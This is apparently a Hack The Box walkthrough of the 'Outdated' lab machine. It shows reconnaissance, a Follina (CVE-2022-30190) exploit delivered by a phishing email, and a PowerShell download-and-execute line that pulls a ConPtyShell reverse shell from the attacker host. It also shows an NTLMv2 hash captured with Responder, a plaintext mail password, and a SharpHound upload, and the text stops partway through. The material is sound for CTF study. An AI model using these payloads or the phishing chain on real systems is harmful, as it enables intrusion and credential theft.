# Outdated

![HTB - Pressed](images/htb_outdated.png)

```bash
TARGET=10.10.11.175
```

```bash
$ sudo nmap -p- --min-rate 10000 $TARGET 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 18:51 PDT
Nmap scan report for 10.10.11.175
Host is up (0.097s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8530/tcp  open  unknown
8531/tcp  open  unknown
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49916/tcp open  unknown
49937/tcp open  unknown
51807/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.11 seconds
```

```bash
$ sudo nmap -p 25,53,88,135,139,389,445,464,593,636,3268,3269,8530,8531,9389 -sV -sC $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 18:53 PDT
Nmap scan report for 10.10.11.175
Host is up (0.092s latency).

PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-23 09:54:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-23T09:55:24+00:00; +8h00m04s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2023-12-13T00:17:36
|_Not valid after:  2024-12-12T00:17:36
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-23T09:55:23+00:00; +8h00m04s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2023-12-13T00:17:36
|_Not valid after:  2024-12-12T00:17:36
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2023-12-13T00:17:36
|_Not valid after:  2024-12-12T00:17:36
|_ssl-date: 2024-06-23T09:55:24+00:00; +8h00m04s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2023-12-13T00:17:36
|_Not valid after:  2024-12-12T00:17:36
|_ssl-date: 2024-06-23T09:55:23+00:00; +8h00m04s from scanner time.
8530/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Potentially risky methods: TRACE
8531/tcp open  unknown
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m03s, deviation: 0s, median: 8h00m03s
| smb2-time: 
|   date: 2024-06-23T09:54:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.99 seconds
```

```bash
$ cat /etc/hosts | grep $TARGET
10.10.11.175  outdated.htb dc.outdated.htb mail.outdated.htb
```

```bash
$ netexec smb $TARGET -u 'kali' -p '' --rid-brute
SMB         10.10.11.175    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.175    445    DC               [+] outdated.htb\kali: 
SMB         10.10.11.175    445    DC               498: OUTDATED\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.175    445    DC               500: OUTDATED\Administrator (SidTypeUser)
SMB         10.10.11.175    445    DC               501: OUTDATED\Guest (SidTypeUser)
SMB         10.10.11.175    445    DC               502: OUTDATED\krbtgt (SidTypeUser)
SMB         10.10.11.175    445    DC               512: OUTDATED\Domain Admins (SidTypeGroup)
SMB         10.10.11.175    445    DC               513: OUTDATED\Domain Users (SidTypeGroup)
SMB         10.10.11.175    445    DC               514: OUTDATED\Domain Guests (SidTypeGroup)
SMB         10.10.11.175    445    DC               515: OUTDATED\Domain Computers (SidTypeGroup)
SMB         10.10.11.175    445    DC               516: OUTDATED\Domain Controllers (SidTypeGroup)
SMB         10.10.11.175    445    DC               517: OUTDATED\Cert Publishers (SidTypeAlias)
SMB         10.10.11.175    445    DC               518: OUTDATED\Schema Admins (SidTypeGroup)
SMB         10.10.11.175    445    DC               519: OUTDATED\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.175    445    DC               520: OUTDATED\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.175    445    DC               521: OUTDATED\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.175    445    DC               522: OUTDATED\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.175    445    DC               525: OUTDATED\Protected Users (SidTypeGroup)
SMB         10.10.11.175    445    DC               526: OUTDATED\Key Admins (SidTypeGroup)
SMB         10.10.11.175    445    DC               527: OUTDATED\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.175    445    DC               553: OUTDATED\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.175    445    DC               571: OUTDATED\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.175    445    DC               572: OUTDATED\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.175    445    DC               1000: OUTDATED\WSUS Administrators (SidTypeAlias)
SMB         10.10.11.175    445    DC               1001: OUTDATED\WSUS Reporters (SidTypeAlias)
SMB         10.10.11.175    445    DC               1002: OUTDATED\DC$ (SidTypeUser)
SMB         10.10.11.175    445    DC               1103: OUTDATED\DnsAdmins (SidTypeAlias)
SMB         10.10.11.175    445    DC               1104: OUTDATED\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.175    445    DC               1105: OUTDATED\CLIENT$ (SidTypeUser)
SMB         10.10.11.175    445    DC               1106: OUTDATED\btables (SidTypeUser)
SMB         10.10.11.175    445    DC               1107: OUTDATED\ITStaff (SidTypeGroup)
SMB         10.10.11.175    445    DC               1108: OUTDATED\sflowers (SidTypeUser)
```

```bash
$ cat tmp.list | grep 'SidTypeUser' | awk '{print $6}' | awk -F '\' '{print $2}' | sort -u | grep -v '\$$' | tr '[:upper:]' '[:lower:]' > users.list

$ cat users.list

administrator
btables
guest
krbtgt
sflowers

$ cat users.list | grep -v krbtgt > tmp.list; mv tmp.list users.list

$ cat users.list
administrator
btables
guest
sflowers
```

```bash
$ netexec smb $TARGET -u users.list -p users.list --no-bruteforce --continue-on-success
SMB         10.10.11.175    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.175    445    DC               [-] outdated.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.175    445    DC               [-] outdated.htb\btables:btables STATUS_LOGON_FAILURE 
SMB         10.10.11.175    445    DC               [-] outdated.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.175    445    DC               [-] outdated.htb\sflowers:sflowers STATUS_LOGON_FAILURE
```

```bash
$ impacket-GetNPUsers outdated.htb/ -usersfile users.list -format hashcat -outputfile hashes.asreproast 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User btables doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sflowers doesn't have UF_DONT_REQUIRE_PREAUTH set
```

```bash
$ netexec smb $TARGET -u users.list -p '' --shares                      
SMB         10.10.11.175    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.175    445    DC               [-] outdated.htb\administrator: STATUS_LOGON_FAILURE 
SMB         10.10.11.175    445    DC               [-] outdated.htb\btables: STATUS_LOGON_FAILURE 
SMB         10.10.11.175    445    DC               [-] outdated.htb\sflowers: STATUS_LOGON_FAILURE 
SMB         10.10.11.175    445    DC               [+] outdated.htb\guest: 
SMB         10.10.11.175    445    DC               [*] Enumerated shares
SMB         10.10.11.175    445    DC               Share           Permissions     Remark
SMB         10.10.11.175    445    DC               -----           -----------     ------
SMB         10.10.11.175    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.175    445    DC               C$                              Default share
SMB         10.10.11.175    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.175    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.175    445    DC               Shares          READ            
SMB         10.10.11.175    445    DC               SYSVOL                          Logon server share 
SMB         10.10.11.175    445    DC               UpdateServicesPackages                 A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
SMB         10.10.11.175    445    DC               WsusContent                     A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         10.10.11.175    445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

```bash
$ netexec smb $TARGET -u 'guest' -p '' -M spider_plus
SMB         10.10.11.175    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.175    445    DC               [+] outdated.htb\guest: 
SPIDER_PLUS 10.10.11.175    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.11.175    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.11.175    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.11.175    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.11.175    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.11.175    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.11.175    445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_spider_plus
SMB         10.10.11.175    445    DC               [*] Enumerated shares
SMB         10.10.11.175    445    DC               Share           Permissions     Remark
SMB         10.10.11.175    445    DC               -----           -----------     ------
SMB         10.10.11.175    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.175    445    DC               C$                              Default share
SMB         10.10.11.175    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.175    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.175    445    DC               Shares          READ            
SMB         10.10.11.175    445    DC               SYSVOL                          Logon server share 
SMB         10.10.11.175    445    DC               UpdateServicesPackages                 A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
SMB         10.10.11.175    445    DC               WsusContent                     A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         10.10.11.175    445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
SPIDER_PLUS 10.10.11.175    445    DC               [+] Saved share-file metadata to "/tmp/nxc_spider_plus/10.10.11.175.json".
SPIDER_PLUS 10.10.11.175    445    DC               [*] SMB Shares:           9 (ADMIN$, C$, IPC$, NETLOGON, Shares, SYSVOL, UpdateServicesPackages, WsusContent, WSUSTemp)
SPIDER_PLUS 10.10.11.175    445    DC               [*] SMB Readable Shares:  2 (IPC$, Shares)
SPIDER_PLUS 10.10.11.175    445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.11.175    445    DC               [*] Total folders found:  0
SPIDER_PLUS 10.10.11.175    445    DC               [*] Total files found:    1
SPIDER_PLUS 10.10.11.175    445    DC               [*] File size average:    104.47 KB
SPIDER_PLUS 10.10.11.175    445    DC               [*] File size min:        104.47 KB
SPIDER_PLUS 10.10.11.175    445    DC               [*] File size max:        104.47 KB
```

```bash
$ cat /tmp/nxc_spider_plus/10.10.11.175.json 
{
    "Shares": {
        "NOC_Reminder.pdf": {
            "atime_epoch": "2022-06-20 08:01:36",
            "ctime_epoch": "2022-06-19 18:14:47",
            "mtime_epoch": "2022-06-20 08:00:33",
            "size": "104.47 KB"
        }
    }
} 
```

```bash
$ smbclient //$TARGET/Shares -N -I $TARGET --user 'guest' --password ''
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 20 08:01:33 2022
  ..                                  D        0  Mon Jun 20 08:01:33 2022
  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 08:00:32 2022

                9116415 blocks of size 4096. 1815983 blocks available
smb: \> get NOC_Reminder.pdf
getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (81.7 KiloBytes/sec) (average 81.7 KiloBytes/sec)
smb: \> exit
```

![PDF - NOC - CVEs](images/pdf_noc.png)

> Due to last week’s security breach we need to rebuild some of our core servers. This has impacted a handful of our workstations, update services, monitoring tools and backups. As we work to rebuild, please assist our NOC by e-mailing a link to any internal web applications to `itsupport@outdated.htb` so we can get them added back into our monitoring platform for alerts and notifications.
>
> We have also onboarded a new employee to our SOC to assist with this matter and expedite the recovery of our update services to ensure all critical vulnerabilities are patched and servers are up to date.  The CVE list below is top priority, and we must ensure that these are patched ASAP.
>
> Thank you in advance for your assistance. If you have any questions, please reach out to the mailing list above.

| CVE | Description |
| -- | -- |
| CVE-2022-30190 | Microsoft Windows Support Diagnostic Tool (MSDT) Remote Code Execution Vulnerability |
| CVE-2022-30138 | Windows Print Spooler Elevation of Privilege Vulnerability |
| CVE-2022-30129 | Visual Studio Code Remote Code Execution Vulnerability |
| CVE-2022-29130 | Windows LDAP Remote Code Execution Vulnerability |
| CVE-2022-29110 | Microsoft Excel Remote Code Execution Vulnerability |

## CVE-2022-30190 - Follina

```bash
$ sudo nc -lvnp 80                          
listening on [any] 80 ...
```

```bash
$ swaks --to itsupport@outdated.htb --from kali@hacker.com --header "Subject: Web" --body "please click here http://10.10.14.3/test.html" --server $TARGET
=== Trying 10.10.11.175:25...
=== Connected to 10.10.11.175.
<-  220 mail.outdated.htb ESMTP
 -> EHLO kali
<-  250-mail.outdated.htb
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<kali@hacker.com>
<-  250 OK
 -> RCPT TO:<itsupport@outdated.htb>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Sat, 22 Jun 2024 23:47:35 -0700
 -> To: itsupport@outdated.htb
 -> From: kali@hacker.com
 -> Subject: Web
 -> Message-Id: <20240622234735.228096@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> please click here http://10.10.14.3/test.html
 -> 
 -> 
 -> .
<-  250 Queued (10.594 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

```bash
$ sudo nc -lvnp 80                          
listening on [any] 80 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.175] 49834
GET /test.html HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.906
Host: 10.10.14.3
Connection: Keep-Alive
```

> WindowsPowerShell/5.1.**19041.906** = KB5000842

![KB5000842](images/KB5000842.png)

```bash
$ git clone https://github.com/chvancooten/follina.py.git
Cloning into 'follina.py'...
remote: Enumerating objects: 131, done.
remote: Counting objects: 100% (22/22), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 131 (delta 11), reused 8 (delta 8), pack-reused 109
Receiving objects: 100% (131/131), 51.61 KiB | 1.36 MiB/s, done.
Resolving deltas: 100% (58/58), done.

$ cd follina.py

$ mkdir www

$ wget https://github.com/antonioCoco/ConPtyShell/raw/master/Invoke-ConPtyShell.ps1 -O www/Invoke-ConPtyShell.ps1
...
2024-06-23 00:20:55 (2.03 MB/s) - ‘www/Invoke-ConPtyShell.ps1’ saved [72846/72846]

$ echo "Invoke-ConPtyShell 10.10.14.3 9001" >> www/Invoke-ConPtyShell.ps1

$ tail follina.py/www/Invoke-ConPtyShell.ps1 

class MainClass
{
    static void Main(string[] args)
    {
        Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
    }
}

"@;Invoke-ConPtyShell 10.10.14.3 9001
```

```bash
$ sudo python3 follina.py -m command -t rtf -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/Invoke-ConPtyShell.ps1')"
Generated 'clickme.rtf' in current directory
Generated 'exploit.html' in 'www' directory
Serving payload on http://localhost:80/exploit.html
```

```bash
$ tail follina.py/www/exploit.html          
...
tristique arcu, et laoreet purus elit ac lectus. Ut venenatis tempus magna, non varius augue consectetur ut.

Etiam elit risus, ullamcorper cursus nisl at, ultrices aliquet turpis. Maecenas vitae odio non dolor venenatis varius eu ac sem. Phasellus id tortor tellus. Ut vehicula, justo ac porta facilisis, mi sapien efficitur ipsum, sit fusce.
</p>
<script>
    location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwBJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAuAHAAcwAxACcAKQA='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"";
</script>

</body>
</html>
```

```bash
$ stty raw -echo; (stty size; cat) | nc -lvnp 9001
listening on [any] 9001 ...
```

```bash
$ swaks --to itsupport@outdated.htb --from kali@hacker.com --header "Subject: Web" --body "please click here http://10.10.14.3/exploit.html" --server $TARGET
=== Trying 10.10.11.175:25...
=== Connected to 10.10.11.175.
<-  220 mail.outdated.htb ESMTP
 -> EHLO kali
<-  250-mail.outdated.htb
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<kali@hacker.com>
<-  250 OK
 -> RCPT TO:<itsupport@outdated.htb>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Sun, 23 Jun 2024 09:41:04 -0700
 -> To: itsupport@outdated.htb
 -> From: kali@hacker.com
 -> Subject: Web
 -> Message-Id: <20240623094104.009194@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> please click here http://10.10.14.3/exploit.html
 -> 
 -> 
 -> .
<-  250 Queued (11.000 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

```bash
$ sudo python3 follina.py -m command -t rtf -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/Invoke-ConPtyShell.ps1')"
Generated 'clickme.rtf' in current directory
Generated 'exploit.html' in 'www' directory
Serving payload on http://localhost:80/exploit.html
10.10.11.175 - - [23/Jun/2024 00:32:32] "GET /exploit.html HTTP/1.1" 200 -
10.10.11.175 - - [23/Jun/2024 00:32:34] "GET /Invoke-ConPtyShell.ps1 HTTP/1.1" 200 -
```

```bash
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\btables\AppData\Local\Temp\SDIAG_7a49cd60-49a5-405b-a268-52e1ce0bde5f> whoami
outdated\btables
```

This is the script running to check the apps on the emails.

```bash
PS C:\Users\btables> cat check_mail.ps1
Import-Module Mailozaurr
$user = 'btables@outdated.htb'
$pass = 'GHKKb7GEHcccdCT8tQV2QwL3'
$regex = [Regex]::new('(http(s)?(:\/\/))?((\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[\w.]\.htb)(\/[^\s,]+)?)')     
$already_seen = @()
$client = connect-imap -server 'mail.outdated.htb' -password $pass -username $user -port 143 -options auto   
while ($true) {
    $msgs = Get-IMAPFolder -client $client -verbose
    foreach ($msg in $msgs.Messages) {
        if (-not ($already_seen -contains $msg.MessageId)) {
            $already_seen = $already_seen + $msg.MessageId
            $match = $regex.Matches($msg.TextBody.TrimEnd())
            iwr $match.Value
        }
    }
    if ($already_seen.count -ge 60) {$already_seen = @()}
    #Disconnect-IMAP -Client $client
    sleep 15
    if (get-process -name msdt) {stop-process -name msdt -force}
    sleep 15
}
```

The credentials used on the script seems to be only valid for the email server. It does not work for the domain.

```bash
$ netexec smb $TARGET -u 'btables' -p 'GHKKb7GEHcccdCT8tQV2QwL3'
SMB         10.10.11.175    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.175    445    DC               [-] outdated.htb\btables:GHKKb7GEHcccdCT8tQV2QwL3 STATUS_LOGON_FAILURE
```

The hostname for the host we got a shell is `Client`, and checking its IP on `systeminfo` (172.16.20.20() it seems we are not on our real target (IP 10.10.11.175).

```bash
PS C:\Users\btables> systeminfo

Host Name:                 CLIENT
OS Name:                   Microsoft Windows 10 Enterprise N
OS Version:                10.0.19043 N/A Build 19043
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          setup
Registered Organization:
Product ID:                00330-00182-51735-AA058
Original Install Date:     6/15/2022, 8:20:38 AM
System Boot Time:          7/1/2024, 11:37:16 PM
System Manufacturer:       Microsoft Corporation
System Model:              Virtual Machine
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              American Megatrends Inc. 090007 , 5/18/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     1,652 MB
Available Physical Memory: 570 MB
Virtual Memory: Max Size:  2,292 MB
Virtual Memory: Available: 899 MB
Virtual Memory: In Use:    1,393 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    outdated.htb
Logon Server:              \\DC
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB4601554
                           [02]: KB5000736
                           [03]: KB5001330
                           [04]: KB5001405
Network Card(s):           1 NIC(s) Installed.
                           [01]: Microsoft Hyper-V Network Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.20.20
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```bash
PS C:\Users\btables> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : client
   Primary Dns Suffix  . . . . . . . : outdated.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : outdated.htb

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Microsoft Hyper-V Network Adapter
   Physical Address. . . . . . . . . : 00-15-5D-19-AE-01
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 172.16.20.20(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.20.1
   DNS Servers . . . . . . . . . . . : 172.16.20.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

Only `administrator` is present here, but we don't have access to it.

```bash
PS C:\Users> dir
    Directory: C:\Users
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/15/2022  10:45 AM                administrator
d-----        12/13/2023   4:20 PM                btables
d-r---         6/15/2022   9:23 AM                Public
```

We know that we can reach to our kali from this machine, and we can try to get the the NTLM hash using `Responder`.

```bash
$ sudo responder -I tun0 -wv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
...
```

```bash
PS C:\Users> net use \\10.10.14.2\share
Enter the user name for '10.10.14.2':
```

```bash
[+] Listening for events...

[!] Error starting TCP server on port 80, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.11.175
[SMB] NTLMv2-SSP Username : OUTDATED\btables
[SMB] NTLMv2-SSP Hash     : btables::OUTDATED:5174cb6ce4f72a1e:4B4509BF7380512DF4D509FFD05F57BD:0101000000000000804E2D42CCC8DA01F739C3EA0218AFB000000000020008004B004F0059004B0001001E00570049004E002D004600550035004C00450038004A00380042005400310004003400570049004E002D004600550035004C00450038004A0038004200540031002E004B004F0059004B002E004C004F00430041004C00030014004B004F0059004B002E004C004F00430041004C00050014004B004F0059004B002E004C004F00430041004C0007000800804E2D42CCC8DA010600040002000000080030003000000000000000000000000020000064ECF5C95CEC69A0D9EC1102AD1E00CEAE250BB8F3AD554D1997FB7DC85CB00F0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000
```

```bash
$ cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.11.175.txt 
btables::OUTDATED:5174cb6ce4f72a1e:4B4509BF7380512DF4D509FFD05F57BD:0101000000000000804E2D42CCC8DA01F739C3EA0218AFB000000000020008004B004F0059004B0001001E00570049004E002D004600550035004C00450038004A00380042005400310004003400570049004E002D004600550035004C00450038004A0038004200540031002E004B004F0059004B002E004C004F00430041004C00030014004B004F0059004B002E004C004F00430041004C00050014004B004F0059004B002E004C004F00430041004C0007000800804E2D42CCC8DA010600040002000000080030003000000000000000000000000020000064ECF5C95CEC69A0D9EC1102AD1E00CEAE250BB8F3AD554D1997FB7DC85CB00F0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000
```

But it seems the password is not on HTB common wordlist `rockyou.txt`.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.11.175.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:10 DONE (2024-06-27 20:05) 0g/s 1333Kp/s 1333Kc/s 1333KC/s !SkicA!..*7¡Vamos!
Session completed.
```

We see that we are really autenticated with a domain user. We can try to collect bloodhoud data direct on the shell. For that lets transfer `SharpHouse.exe` to the machine and run it from there.

```bash
$ python3 -m http.server 8181
Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8181/) ...
```

```bash
PS C:\Users> mkdir C:\Temp
    Directory: C:\
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          7/2/2024   2:52 AM                Temp
PS C:\Users> cd C:\Temp

PS C:\Temp> iwr http://10.10.14.2:8181/SharpHound.exe -outfile SharpHound.exe
PS C:\Temp> dir
    Directory: C:\Temp
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/2/2024   2:53 AM         906752 SharpHound.exe
```

```bash
PS C:\Temp> C:\Temp\SharpHound.exe -C all
2024-07-02T02:53:53.3383016-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, 
Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-07-02T02:53:53.3539224-07:00|INFORMATION|Initializing SharpHound at 2:53 AM on 7/2/2024
2024-07-02T02:53:54.1607086-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Tru
sts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-07-02T02:53:54.6256591-07:00|INFORMATION|Beginning LDAP search for outdated.htb
2024-07-02T02:53:54.7741817-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-07-02T02:53:54.7741817-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-07-02T02:54:24.7355674-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 37 MB RAM
2024-07-02T02:54:45.3502445-07:00|INFORMATION|Consumers finished, closing output channel
2024-07-02T02:54:45.4283680-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
